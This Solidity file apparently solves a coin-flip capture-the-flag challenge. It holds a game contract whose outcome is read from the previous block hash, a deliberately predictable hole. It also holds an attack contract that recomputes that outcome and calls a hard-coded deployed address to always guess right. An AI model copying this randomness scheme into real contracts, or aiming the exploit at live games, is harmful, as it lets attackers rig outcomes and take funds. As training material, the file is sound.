// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract CoinFlip {
    uint256 public consecutiveWins;
    uint256 lastHash;
    uint256 FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor() {
        consecutiveWins = 0;
    }

    function flip(bool _guess) public returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));

        if (lastHash == blockValue) {
            revert();
        }

        lastHash = blockValue;
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        if (side == _guess) {
            consecutiveWins++;
            return true;
        } else {
            consecutiveWins = 0;
            return false;
        }
    }
}

contract CoinFlip2 {
    CoinFlip public oldContract;
    uint256 public consecutiveWins;
    uint256 lastHash;
    bool public lastValue;
    bool public correct;
    uint256 FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;

    function guessOne(bool _guess) public {
        oldContract = CoinFlip(0x807fdfD056D0Ad8c1215dbaA3917DefEE364eE63);

        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        lastValue = side;

        if (side == _guess) {
            oldContract.flip(_guess);
            correct = true;
        } else {
            oldContract.flip(!_guess);
            correct = false;
        }
    }
}
